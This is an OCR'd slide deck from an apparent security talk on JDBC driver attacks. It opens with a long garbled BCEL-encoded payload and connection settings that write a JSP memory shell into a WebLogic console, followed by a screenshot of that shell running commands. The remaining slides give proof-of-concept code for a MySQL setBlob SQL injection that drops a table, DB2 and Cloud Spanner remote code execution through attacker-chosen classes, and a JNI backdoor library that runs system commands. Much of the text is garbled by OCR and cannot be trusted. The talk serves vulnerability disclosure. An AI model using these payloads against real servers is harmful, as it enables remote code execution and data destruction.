PSdbGS$hS95ScOK$c8$c3$c8&SwS97 Se5M$ j S8eSe3Sb5S$9cuSr$9ds$ F1Sd4B$3b$9 F$8eq$s F9j $s$e5$84$cdrs F5$9enj $xSe4T $9brSA5SA$ FdSb2$vs9FfSa6scb$dcSed$b3$ fds fcL$a7$db$84$7c$dfsaa0sSaf$s$90$ F3Se25 Fc$3b$ FOSRy$hi$e7$5c$L
S5bYS f4S rwSw$8 f$de$92SefIJi$p$3esbesSees3d$ fb$ F8$7e$ IJ$ee$87 IS y$zSa3$bFf$c3$c7$bcSXx$E$ f8$3es f1$c4$abS$deSc3wSeb$b6$8 F$96$ FbSed$82Sbes8er$bfSVs$8ds$ fa$8Ff$_52$ fFO$3b$ F4qSC$d7Sec$ Ff FSW F8SSHS7bOL$7 F$cf$F1Sb2$ FF
SffS$5eSce$ fb$b4$hv$U$d8$3a$e3$flesfcsT$e5$ff$bc$l$fO$7b$9aCSc2m$sr$3c$3e$besd5$ba$ccxN_Sbby$a9$e1$83Sdf$ef$m$bFfSH9$83$3b$8ar$e3$afSIS8cs f3Se0$c2_$xX$c4$86$bedh$5e$81$uSe7$935 f9$ F3Sbc$bes$9d$$$c2$dFf$e9
$ad3$3aa$c1$e0$85$M$5d$96SafSASkCSb5$be$y$c6$ f5$ISUSd8SGSbfSebSbb3$de$7b$$$g$ Fb$cO$a6S60$BSec$ fa$3eSde$Yc$b2$n$cO$7 f$b9$desSs6$dek$85hVSUS83$9e$s$7eSa3x$cl$e3g$3e9$G$ a6$cbn0$d5$d7 13_$w$w$zaSeb$yS$ebSE
SD$89$ f9MSaf$b7PS5cOEST$bbx$c4uSadScdV$b4$CS5b$5d$xd$b2b$3d$83$96$b2$e9$c3s8R$90$ f5g0SbcSbbScOSyY$e2$wj Sas fol FSc5h8Sv$S$ca$cc$b3$98a$des9IOws5bSed$C$_z$3d$ySe45L5$7c$ f9SySc3Sbb$V$3e$d7$ fF8$3b$ROqSdo00$
3f$dees fONS85w$$1$c4$j$9aS$e0$ Fd$da$8fv$5bSQScb$9c$_W$e0$zn$93$9b$kS$e7N$ F4GS f 1$0$ e5$0Sb3$V$b8$8es F3$ad$b4$99$8a$ feSARSceS$df$e0$c fUSeeST $dO$b7$98xXe$ FeSb6$el$d1$5c$9b$d5$98Sbb$aaSa7$A$7cSc5VSdb$aca$c4$
WtnStSLq$9fB$_S$v$caZ$bd$SAw$8cD$60$e2$7iSTScb$lo$s97y$c2$ba$a79_$84$c7S$d8$88S5c$84q$d9$3cY$ F8$5e$90Sa5$c7$c9$93Sel$b1$V$7b$ fF9PSefSa7SdFf$ Fd F2Sn$cO$ FESe6SWwSdb$9d$5b$k$d9PSc5SxBSad$H$db$bd$Xx$ f2$c7$ F9SQ$F
3$b8$b7$a3$c8MM1$c6$1$M$916$ faSOS5d$b1$d1$df$d3ws$ flRo$a3$ef$d1$f71$ab$d4$ fbS$cb$b1$bdS$c7$9esxXrc$e4$c3$8cp$ fFdSbO$d9$ 7b$e4$de$a8$81$e9$8b$bFf$cec$97$7 F$a$ L$80$ FeS9OSNSc4F$ Ff FHS fF FS$c4ws$ fF fSn$c6$c52$9F$d6
SGSF5$c1$cdFSFFLS3 Ff SbOSd1SbfSdOSbf SdaSe8SdfSe8SdFf$ fbScc$ faV$3b$_Sf1SCS$cd$ feSaf$8esS rO$1$jz$ 7 S80Se9S FFS7eSb3S7CS7 FfSe3RUSS$b8$b6k$e3$99S83SMAS8c$cd$b2$c4$d1$ebRSbdSadh$bb$a8$lS$b9G$j TUS a5$mSa9L$96$95F$e
3$3e$q$95$86SSU$b4$92$$kSX$c9$d8$ FeaUSaO$T$ f7SZS85$RS$GSb9YSafcr$edSN$9c$3dw$d8SbO$3bY$d8$99D$ F78$c4q$ FEScOSe9ScO$ce$d1$89$SzS$af$cfkbsc$83$93N$jv$b4$cO$8FfI$8es L$94S$BSee$ f1$dd$86j $8a$3e$e3$9a$d63$d7$bc
S40ASZScc$82SaaTws f2$7dS$ F7$3F$7d$88$ F4$ebSH$c4$9e$7bS$a7$c3S98SR$88S8d7kISSd6F$c7$91$86$a2$Z$ fe$_S$ZgS5cg$b3$ fcS$6O$cc$dc$92$d4Sa6$b2$b6$c1$zSkSeeSw$d8S$93$9 f$x$ZG$p$C$z$jrSur$fdSm$e8SdoOSs9las$a8$d3$b7n
S$98S1TS$F5$s$da$b1$5d$d6$ f7$828$ fb$$$a76$ Fo$8F$3 fSGSmBS$aOSP$i$a2$dc$al$9a$98An$cc$ fes7b$b3c$a7$96M$8d$d2$96$a2$1$1$G$91Sw$ 7b$bdSb2$p$c5$a2U$ Fb$j $c1l$c2$8Ff2S$a4R$FSd6$3cS$b8S$5b$ IwQ$aasc7yk$a9$c8$caS95sYH
LpES3 Fx6$ F8$9e4$a53Se4S0$L$ F1$8FS89SES TeSadSBOSebSC$9eSe6pSXps$ L$9c$7e$99$84$97 SbO8BS97p$j $d2$81$pSb4S8ssabScdsm$a0$cb$b4$84$ foOo0G4Sc0S$99885$3cSe8Scc$80$7d$ F25V$3a$b2MSD$alo$90$v$ F325N$86$c FOOSd3PDX6
Scdl$93yy$d0az$93SW$j S83v$cb$97S$c9$89$db$ fFOSdOkd$cd$M$d8$8Ff$c63$a6$af$93$z$9eSZS$e4$d7m$ gy 6$dd$ba$ fb$c3$e5$n$c7$ed6$s8ds$$PsdesSba$ fb$96$c3t$87$ab6$j $s$d36$8d9L3S60$b3d$GF$c15$ FOSKS8d$83m$ F6u$ 7eSdf$s$ fo
Shd$bd$z$dc$86$9a$d3$U$aGU$3a$GSh$b9$RO$d2$u$ael$a8$Y$c7j S$9dSs$vIStsvESaTSvsSNn$ca$yho$80$ fa$3a$85$e9CScOSdesAsSe6$c3Xx1$94Sc3SdFfSc7SvSaf Shs LSAwSY $d fSab$ F45E$8c$85$a9$90$ FaSUSeef$ FalzS9aSY$F6$i$a5$WwSE9s
e4$86$e3SsSa9F$k$ f2$c29$t$a9L$3e$ F2C$8 f$d3T S$80$8c$m$dc$b7$d2s$a5$ByY$FSqSE$c8$Z2$dd$Fh$I$bb$98$vb$a653$ j 5$d353E$89T 3$c5$8eSces40y$ce8SISvsToOseSy$d4lLSebqScasmSwy$a8$7 fDSPd$j $db$9ap$3fSNsdfSob$c3$e7g$
GSe0Se4mS3a$k$99Se5$de$9b$9d$c6$a3$FS$9eSbaS$bdSTaSbbN$5d$84$dc$SL$b8I$T$b4$a9sh$3cmH$81$pn$e8$e9r$9a$7eSM$G$e3G$85$7i$ F4SMSM9SCSeaQSdd$b8SBS5d3$9eN$ F3HS ad$P$ F7S$ca$c4s$c4$81S$ec$ FESbe$ 7db$d5$3e$Z$b20$8
5$91SkS91Y$q$88$ fd$c46$9d$b4$3b$b6$e9$81e$93$k$d6$H$j $sS$cOOSnES$Qs$b3$ fd$n$8eSZr$MSe9SY$3d$PN$z$9b$j F$8eS3a$cdQ$w$87EGY8Secs$d4$ f2$bO0c$98$a3SkS$e6$uSabSc3$aas$a3$ac$ivj$f9$a8$e3$uG$3d$c2Q6$8/7MGSd98$ec$d
4S F2$88c$84Sa3$ce$8c$ f5$d2$ fOQSqSUSbFSMSdaSdfSX$cfSM$Ff1$8b$d9$ fes fex$c6S82$VS$cfS$c9c$8ecz$ fe$js$8c$8cS$ZS$Z8SN$s86Es F3Saf$dOc$db$ F4SBp$99$5e$a3G3$D3q$ FOSKS6OSc5$d7$o$ FOS9CL$Z$db$ 7c$90kOSeaSY$d55$YS$e5$b0S
o$d0$d9$e5$b1$81K$e3$93$e3S8e$b1m$3a$f7$rz$c1169$beM$d3$cbv$87$9d$ F3$ccp$9e$e3$8ese3$3a$cfqsSO$3b$b5$3c$el$98$A$k$85a$3fSbFS$X$3b$c1$b1$93$8el$ce8k$eaS9b$84$c8$_O9$a6t$cd$a7$i$93$s$5d$Ff1$Z$aesd7$ F2$I$
c7$89$3b4$eb$40Su$k$c7Fs$9f$a73$0$ fb$ f21$ae$82c1l$AZ1$933$85$95$e3$q_S$dc$a2$el10$8c$L$b7S$ee$so$91$v$ f2$S$C$3cSy$bc$z$7c$X$Bs$ L$dO$93h$9bfaq$j $c5$d3$Y$aac$i$81$3Ff$8esab61A$PSal$ws$deGS4$83IXD2$3cA$P$meN$al
SWSLBS f2$9eF$8d$3d$82SK9CSNzZ$94$3e$CS$ca$e7$e8s fd$ F471 z$8c$9eG$ fa$ddSBSd7$dbt$9e$ 7eEDNSc1J$ F3$c2$YSb9$84S$b4$m$9c$a3kK$82$8bSwss5$ t$e9Sb2$e0$al$r$nLw$84$P$d1U$nGO$T$9b$ F4$94$ FO1zZZ$ F8SULS$Selyr$L_S$n$8Ff$ FOS
oy$85WwSc9$t$7cS9b$ Fc$c2$j$fOSbfMSRhS$besw$7c$8F$d6s F4D$ f For $80Se6$BSe8r $83NB$ f2g0$ F57$c8S0$ F9Sc F$91$8cS$ea$3 f$8esj $baSa4$SA6$B$ F9$d71 $DSabI $ec$e2$d3$93$7 FSKS$ Fb$cc$al$920$d0SISelas faSw$k$a9SE$ FbG$840$a2
$946Se1$8f$87$84S afS91SK$v$sS9aSR$bes$1$5boSa0S8OSwss5$cfQ$85x$d3$ F4A$d3$wS60SupasL$5d$p$8FSC$92$bOScbSb3S80SNSYxS$G$e5$9c$t$x$7dD$b8$G$ L$dd$a0$a3$ F4$7i LSd6SA$b3$d1$ F3$c2$C5$BShSal$3b$c2$Qz$8F$9F$8escl
O$df$a26$bo0$a3$ FOSd4m$eas40Sefl$gsQSbeC$5bz$af$gsSs$desa2$1$d7$8bxXx$T$ Fes 7eSKESCCS7bOS8aSGSe fBy$bb$des$7b$8c$ FFS9FS40_35d3GSeFS7 FSbd$a6$_S$3e$86_$84$ Ff f$a2$xXSeeSc2$a8$81$jnSoSd1L$3Ff$ F5$9FSO$y$do0seb$7d
Se6se3sff$DSccp$f1i$T$L$iSA$sA') .newInstance() }; traceFi leAppend=false; traceLevel=-1;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/memshell. jsp;
```

## Slide 23

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
€ > CG © 127.0.0.1:7001/console/framework/skins/wlsconsole/images/mshell.jsp ox*x* @eqQgowmwmeesg#Hvdodod @n oy i:
java.io.tmpdir=/var/folders/y2/p6q9zkfn52571162r_nceqShh0000gn/T/, java.vendor.url.bug=http://bugreport.sun.com/bugreport/, os.arch=x86_ 64, java.awt.graphicsenv=sun.awt.CGraphicsEnvironment,
java.ext.dirs=/Users/pyn3rd/Library/Java/Extensions:/Library/Java/JavaVirtualMachines/jdk1.8.0_60,jdk/Contents/Home/jre/lib/ext:/Library/Java/Extensions:/Network/Library/Java/Extensions:/System/Library/Java/Extensions:/usr/lib/java,
user.dir=/Users/pyn3rd/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain, line.separator=\n, java.vm.name=Java HotSpot(TM) 64-Bit Server VM,
javax.management.builder.initial=weblogic. management.jmx .mbeanserver.WLSMBeanServerBuilder, file.encoding=UTF-8, org.omg-CORBA.ORBClass=weblogic.corba.orb.ORB, java.specification.version=1.8, launch.use.env.classpath=true } [ibm][db2]
[jcc] Dumping all file properties: { } [ibm][db2][jcc] END TRACE_DRIVER_CONFIGURATION [ibm][db2][jcc] BEGIN TRACE_CONNECTS [ibm][db2][jcc] Attempting connection to 127.0.0.1:5001/test [ibm][db2][jcc] Using properties: {
traceLevel=-1, traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/mshell.jsp, user=weblogic,
password: KAKKKAARKAAAKAAKAKKAAARAAKRAAARAAKAKKAA KR RRAKAAAKK KAA AAA RAKAAAKRARAAKARAARKAAA RAR KR KAAARAAA KAA AKAAA AAA RK RAAAK RAK AAA KARA A RAARRAAARAA RRA A RAK KRAAARKRAARARARKRA KARA RAA KAKA RAK RKAA AK RAAKKAAA RAK AAAARRAAKA RARE RAAK
url=jdbe:db2://127.0.0.1:5001 /test:password=$$BCELS$$IS8b$I$ASASASA$SASASA $adXS8b$7b$Sb$c7Y $7fO$y$Sb$b2$o$c7 HHAbH$3bQ$Ib$a6M$b7n$89$j$d7$b2SS$c7$b | $93$Se$be$a3 $hb$z$cI$9 | d$Sd$b3$dOSj$j$j/KS8a$8fF$$95$8enfHbO$c | $HS9:
traceFileAppe >, username=weblogic } [ibm][db2][jec] END TRACE_CONNECTS [ibm] [db ¢] BEGIN TRACE_DIAGNOSTICS [ibm][db2][jcc][Thread:[ACTIVE] ExccuteThread for queue: 'weblogic.kerncl.Default (self-tuning)']
[SQLException @ 1432618] java.sql. SQLException [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '7' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 1432618] SQL state = null [ibm][db2]{jcc][Thread:[ACTIVE] ExecuteThread:
for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 1432618] Error co 99999 |ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '7' f ue: ri¢ = [ibm]
[db2][jcc][10333][ 11649] No license was found. An appropriate license file db2jcc_license_ must be provided in the CLASSPATH setting. [ibm][|db2]|jcc][Threa uy 4 :'7' for queue: 'weblogic.kernel.Default (self-tuning)']
[SQLException @ 1f432618] Stack trace follov m.ibm.db2.jec.c.SqlException: [ibm][db2][jcc][10333][11649] No license was found. An ap te license file db2jec_li jided in the CLASSPATH setting. at
com.ibm.db2.jcc.c.o.d(o.java:534) at com.ibm.db2.jcc.c.p.a(p, 332) at com.ibm.db2.jcc.c.p.(p.java:404) at com.ibm.db2.,jcc.b.b.(b jav at com.ibm.db2.jcc.DB2Driv
weblogic .jdbc.common internal.DataSourceUtil.testConnection0(DataSourceUtil java:373) at weblogic.jdbc.common.internal.DataSourceUtil.access$000(DataSourceUtil.java:
weblogic .jdbc.common internal.DataSourceUtil$ 1 .run(DataSourceUtil java:287) at java.security. AccessController.doPrivileged(Native Method) at weblogic .jdbc.common internal.DataSourceUtil.testConnection(DataSourceUtil java:284) at
com.bea.console.utils jdbc JDBCUtils.testConnection(IDBCUtils java: 1011) at com.bea.console.actions jdbc datasources.createjdbcdatasource.CreateJ DBCDataS ource.testConnectionConfiguration(CreateJDBCDataSource java:524) at
sun reflect. NativeMethodAccessorlmpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorlmpl.invoke(NativeMethodAccessorImpl.java:62) at sun reflect DelegatingMethodAccessorlmpl.invoke(DelegatingMethodAccessorlmpl java:43) at
java.lang reflect.Method invoke(Method.java:497) at org.apache.beehive netui pageflow.FlowController.invokeActionMethod(FlowController.java:870) at
org.apache beehive netui pageflow.FlowController.getActionMethodForward(FlowController.java:809) at org .apache.beehive netui pageflow.FlowController.internalExecute(FlowController.java:478) at
.apache. beehive netui pageflow.PageFlowController.internalExecute(PageFlowController,java:306) at org.apache.beehive.netui.pageflow.FlowController.execute(FlowController.java:336) at
€ > G © 127.0.0.1:7001/console/aaaa?emd=!s%20-I ca* @©@egou@eeSBHodgd @z oy:
total 40
drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:25 autodeploy
drwxr-x--- 21 pyn3rd staff 672 Jun 20 11:25 bin
drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:25 common
drwxr-x--- 10 pyn3rd staff 320 Sep 14 13:33 config
drwxr-x--- 3 pyn3rd_ staff 96 Jun 20 11:25 console-ext
-IW------- 1 pyn3rd staff 136 Sep 14 13:31 derby.log
-rw-r----- 1 pyn3rd_ staff 92 Sep 14 13:31 derbyShutdown. log
-rw-r----- 1 pyn3rd staff 263 Sep 14 13:31 edit.lok
-rw-r----- 1 pyn3rd staff 327 Apr 26 2019 fileRealm.properties
drwxr-x--- 14 pyn3rd staff 448 Jun 20 11:25 init-info
drwxr-x--- 7 pyn3rd staff 224 Sep 13 22:39 lib
drwxr-x--- 4 pyn3rd staff 128 Jun 20 11:25 nodemanager
drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:28 orchestration
drwxr-x--- 3 pyn3rd staff 96 Sep 14 13:36 original
drwxr-x--- 2 pyn3rd staff 64 Apr 26 2019 resources
drwxr-x--- 7 pyn3rd staff 224 Jun 20 11:28 security
drwxr-x--- 3 pyn3rd staff 96 Jun 20 11:25 servers
```

## Slide 24

Abused Connection Resource Arbitrary Log File Writing

Lexical Syntax Compatibility Unchecked Initialization Class Incorrect Response Disposal

JDBC Attack Protection

## Slide 25

## MySQL JDBC Driver SQL Injection via setBlob Method

- A BLOB is a binary large object that can hold a variable amount of data

- BLOB values are treated as binary strings (byte strings)

- MySQL JDBC driver uses PreparedStatement.setBlob()

## Slide 26

## MySQL JDBC Driver SQL Injection via setBlob Method

• PreparedStatement.setBlob()

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
O @d N DO WF KL W NY
10
11
12
13
14
15
MySQL JDBC Driver SQL Injection via setBlob Method
* PreparedStatement.setBlob()
@Override
public void setBlob(int parameterIndex, InputStream inputStream) throws SQLException {
synchronized (checkClosed().getConnectionMutex()) {
((PreparedQuery<?>)
e) this.query) .getQueryBindings().setBlob(getCoreParameter Index (parameterIndex), inputStream) ;
}
@Override
public void setBlob(int parameterIndex, InputStream inputStream, long Length) throws SQLException
synchronized (checkClosed().getConnectionMutex()) {
((PreparedQuery<?>)
this.query) .getQueryBindings() .setBlob(getCoreParameterIndex(parameterIndex) , inputStream,
length) ;
at
r
```

## Slide 27

## MySQL JDBC Driver SQL Injection via setBlob Method

•

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MySQL JDBC Driver SQL Injection via setBlob Method
characterEncoding = gbk
ASCII Oct Hex
39 Ox27
\ 92 Ohaste
```

## Slide 28

## MySQL JDBC Driver SQL Injection via setBlob Method

- PreparedStatement.setBlob()

o append a couple of single quotes( ) surrounding blob data o escape the single quotes  in blob data with backslash (\) 轡 )   ;   d  r   o   p  t  a  b  l  e  t 1  ;  # de 27 29 3b 64 72 6f 70 20 74 61 62 6c 65 20 74 31 3b 23 27 轡 )  ;  d  r  o  p  t  a  b  l  e  t 1  ;  #   \ 27 de 5 c 27 29 3b 64 72 6f 70 20 74 61 62 6c 65 20 74 31 3b 23 5c 27 27

＂ INSERT INTO t1 ( size,data ) VALUES (20,_ binary       \  ); drop table t1;#\ 轡 ＂

## Slide 29

## MySQL JDBC Driver SQL Injection via setBlob Method

Dabase Server
Master MySQL Slave MySQL
Payload

1

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
MySQL JDBC Driver SQL Injection via setBlob Method
f Dabase Server |
Lec} ee > Et Po SS
Payload Master MySQL Slave MySQL
DriverManager.registerDriver (new com.mysql.cj}.jdbc.Driver());
Connection conn =
DriverManager.getConnection("jdbc:mysql://127.0.0.1:3306/test?user=root&password=pynerd123&useUnicode=true&ch
aracterEncoding=gbk&al LowMultiQueries=true") ;
PreparedStatement ps = conn.prepareStatement ("INSERT INTO tl (size, data) VALUES(?,?)");
File file = new File("/Users/pyn3rd/exp.jpg") ;
FileInputStream fis = new FileInputStream(fi le) ;
ps.setInt(1, (int) file. length ()) ;
ps.setBlob(2, fis);
ps.execute() ;
fis.close();
```

## Slide 30

MySQL JDBC Driver SQL Injection via setBlob Method

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
import java.io.x;
import java.sql.*;
MySQL JDBC Driver SQL Injection via setBlob Method
> public class MySQLJdbcDemo {
public static void main(String[] args) throws ClassNotFoundException, SQLException, IOException {
DriverManager .registerDriver(new com.mysql.cj.jdbc.Driver()) ;
Connection conn = DriverManager .getConnection( url: "jdbc:mysql://127.0.0.1:3306/test ?>user=root&password=pynerd123&useUnicode=true&characterEncoding=gbk&al LowMuLtiQueries=true") ;
PreparedStatement ps = conn.prepareStatement( sql: "INSERT INTO t1 (size, data) VALUES (?,?)");
File file =
FileInputStream fis = new FileInputStream(file) ;
ps.setInt( parameterindex: 1, (int) file.length());
ps.setBlob( parameterindex: 2, fis);
ps.execute();
fis.close();
| MySQLJdbcDemo
new File( pathname: "/Users/pyn3rd/Downloads/jdbc-test/exp.jpg") ;
/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/bin/java
Exception in thread
at
at
at
at
at
com.
com
com
com
com
mysql.
-mysql.
-mysql.
-mysql.
-mysql.
ape
cj.
Cir
cj.
"main"
jdbc.
jdbc.
jdbc.
jdbc.
java.sql.SQLSyntaxErrorException Create breakpoint : Table 'test.t1' doesn't exist
exceptions.SQLError.createSQLException(SQLError.java:120)
exceptions.SQLExceptionsNapping. transLateException(SQLExceptionsMapping. java:122)
ClientPreparedStatement.executeInternal(ClientPreparedStatement. java:953)
ClientPreparedStatement.execute(ClientPreparedStatement.java:370)
jdbc.test.MySQLJdbcDemo.main(MySQLJdbcDemo. java:17)
```

## Slide 31

Abused Connection Resource

Arbitrary Log File Writing

Lexical Syntax Compatibility

Unchecked Initialization Class

Incorrect Response Disposal

JDBC Attack Protection

## Slide 32

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- pluginClassName

**Getter and Setter**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
* pluginClassName
1 public synchronized void setPluginClassName (String paramString)
2 this.pluginClassName = paramString;
3
4
5 public String getPluginClassName() {|
6 return this.pluginClassName; | Getter and Setter |
vA j
8
9 public static String getPluginClassName(Properties paramProperties)
10 O return paramProperties.getProperty ("pluginClassName") ;
12
```

## Slide 33

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

• No Argument Constructor

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
* No Argument Constructor
import javax.naming.NamingException;
import java.710.IOException;
public class EvilObject {
public EvilObject () throws NamingException, IOException {
javax.naming.InitialContext.doLookup("lLdap://127.0.0.1:389/Evi LObject") ;
at
J
```

## Slide 34

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- No Argument Constructor

**Thoughts Class**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
* No Argument Constructor
Thoughts Class
DriverManager.registerDriver (new com.ibm.db2.jcc.DB2Driver
DriverManager.getConnection("jdbc:db2://127.0.0.1:5001/testdb: plLuginClLassName=com.example.demo.EvilObject;"
```

## Slide 35

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
import java.sql.DriverMaonager ;
15 usages
> public class DB2JCCDemo {
b public static void main(String[] args) throws Exception { eee
DriverManager.registerDriver(new com.ibm.db2.jcc.D0B2Driver());
AC ¥- %
DriverManager.getConnection( url: "jdbc:db2://127.0.0.1:5001/testdb:pluginClassName=com.example.EvilObject;"); Fi 8 fe)
Sh
ol
o
EEE ©
Run: DB2JCCDemo
> htt Gon. abm.db2. jec . UB2Uriver .connect (DB2Driver, java: 471)
at com.ibm.db2.jcc.DB2Driver.connect( Driver.java:117)
FaaN at java.sql.DriverManager.getConnection (DriverManager. java: 664)
= at java.sql.DriverManager .getConnection(DriverManager.java:270)
it at com.example.jdbc.attack.db2.DB2JCCDemo.main(DB2JCCDemo. java:13)
= Caused by: java.security.PrivilegedActionException Create breakpoint : com.ibm.db2.jcc.am.SqlException: [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DE
= ' at com.ibm.db2.jcc.am.is.aCi Actsiep)
- 11 more
Caused by: com.ibm.db2.jcc.am.SqlException Create breakpoint : [jcc][20148][14226][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB2JCCPlugin. ERRORCODE=-4461, SQLSTATE=nul
at com.ibm.db2.jcc.am.b7.a(b7. java: 794)
at com.ibm.db2.jcc.am.b7.a(b7. java: 66)
at com.ibm.db2.jcc.am.b7.a(b7. java:116)
at com.ibm.db2.jcc.am.ct.run(ct. java: 33)
13 more
Process finished with exit code 1
```

## Slide 36

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

Try to find a No Argument Constructor in the real-world scenario

## Slide 37

## JNI (Java Native Interface)

###### • System.loadLibrary method to revoke the libraries from various platforms

JVM File
JNI
Windows JVM .dll
Source Code Byte Code Linux JVM .so
.dylib
MacOS JVM

## Slide 38

com.sun.security.auth.module.UnixSystem

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
com.sun.security.auth.module.UnixSystem
@jdk.Exported
public class UnixSystem
private native void getUnixInfo() ;
protected String username;
protected long uid;
cted long gid;
O CGO N DW OW KR WN
ected longl] groups;
10
2 x Instantiate code>UnixSystem</code id load
3 « the tive Ui t e the underlying tem informati¢
15 public UnixSystem()
16 O System. LoadLibrary ("jaas_unix") ;
17 getUnixInfo() ;
18 }
```

## Slide 39

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- Hijack the Java library jaas_unix (Java Authentication and Authorization Service)

- com.sun.security.auth.module.UnixSystem (Linux )

   - Public Constructor

- com.sun.security.auth.module.NTSystem  (Windows)

**java.library.path**

/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/jre/lib

libjaas_unix.dylib

## Slide 40

JNI Backdoor for Command Execution

##### **libjaas_unix.dylib**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
JNI Backdoor for Command Execution
#include <stdli
#include <string>
#include
ce std;
using
jint JNI_OnLoad(JavaVMx vm, void* reserved) {
JNIEnv* env;
vm->AttachCurrentThread((void*x*x)&env, NULL);
jclass system_clazz = env—>FindClass("java/lang/System") ;
jmethodID get_property_method = env->GetStaticMethodID(system_clazz,
if (get_property_method == NULL) {
return JNI_VERSION_1_2;
r)
jboolean jsCopy;
const charx cmd = env->GetStringUTFChars (env->NewStringUTF ("open
std::string ee;
ee += cmd;
system(ee.c_str());
return JNI_VERSION_1_2;
I) pes
or"), &jsCopy) ;
```

## Slide 41

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- Remote Code Execution with JNI

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
¢ Remote Code Execution with JNI
DriverManager.registerDriver com.ibm.db2.jcc.DB2Driver
DriverManager .getConnection("jdbc:db2://127.0.0.1:5001/test:pluginC LassName=com.sun.security.auth.module.Unix
System;"
```

## Slide 42

IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
import java.sql.DriverManager;
public class DB2JCCDemo {
public static void main(String[] args) throws Exception {
// Register Driver
DriverManager.registerDriver(new com.ibm.db2.jcc.0B2Driver());
// Get Connection
DriverManager.getConnection( url: "jdbc:db2://127.0.0.1:5001/testdb : pluginClassName=com. example.Evil0bject;") ;
-com.example.jdbc.attack.db2.DB2JCCDemo »
at com.ibm.db2.jcc.DB2Driver.connect (DB2Driver. java:117)
at java.sql.DriverManager .getConnection(DriverManager. java:664)
at java.sql.DriverManager .getConnection(DriverManager. java:270)
at com.example. jdbc. attack.db2.DB2ICCDemo.main(DB2JCCDemo. java:12)
Caused by: java.security.PrivilegedActionException Create breakpoint : com.ibm.db2.jcc.am.SqlException: [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB
at com.ibm.db2.jcc.am.is.a(Cis. java: 4586)
- 11 more
Caused by: com.ibm.db2.jcc.am.SqlException Create breakpoint : [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB2JCCPlugin. ERRORCODE=-4461, SQLSTATE=nul
at com.ibm.db2.jcc.am.b7.a(b7. java: 794)
at com.ibm.db2.jcc.am.b7.a(b7. java: 66)
at com.ibm.db2.jcc.am.b7.a(b7. java:116)
at com.ibm.db2.jcc.am.ct.run(ct.java:33)
- 13 more
```

## Slide 43

## Google Cloud Spanner Remote Code Execution via Unchecked Class

###### • CredentialsProvider

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Google Cloud Spanner Remote Code Execution via Unchecked Class
* CredentialsProvider
1 static @Nullable CredentialsProvider parseCredentialsProvider (String uri) {
2 String name parseUriProperty (uri, CREDENTIALS_PROVIDER_PROPERTY_NAME) ;
3 (name != null) {
4 try {
5 Class<? extends CredentialsProvider> clazz =
6 (Class<? extends CredentialsProvider>) Class. forName (name) ;
7 O Constructor<? extends CredentialsProvider> constructor = clazz.getDeclaredConstructor () ;
8 return constructor.newInstance() ;
9 + catch (ClassNotFoundException classNotFoundException) {
10 throw SpannerExceptionFactory.newSpannerException (
11 ErrorCode.INVALID_ARGUMENT ,
12 "Unknown or invalid CredentialsProvider class name: " + name,
13 classNotFoundException) ;
```

## Slide 44

Google Cloud Spanner Remote Code Execution via Unchecked Class

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
>
>
Run:
Google Cloud Spanner Remote Code Execution via Unchecked Class
import java.sql.DriverManager;
import java.sql. SQLException;
public class CloudSpannerDemo {
public static void main(String[] args) throws SQLException {
System.setProperty("cmd","open -a calculator") ;
DriverManager.registerDriver(new com.google.cloud.spanner. jdbc. JdbcDriver()) ;
DriverManager .getConnection( url: "jdbc:cloudspanner: /projects/lLearning-pjm/instances/test/databases/test; credentialsProvider=com.sun. security .auth.module.UnixSystem") ;
eee
com.mysql.jdbc.test.CloudSpannerDemo
a} le dle >)
au
at
Caused
at
at
at
at
at
Java. sqc-Dra
CTManager.ogecoOMmicc LLUN (UE LVElmdiayer. java. 2/0)
com.mysql.jdbc.test.CloudSpannerDemo .main(€LoudSpannerDemo. java:14)
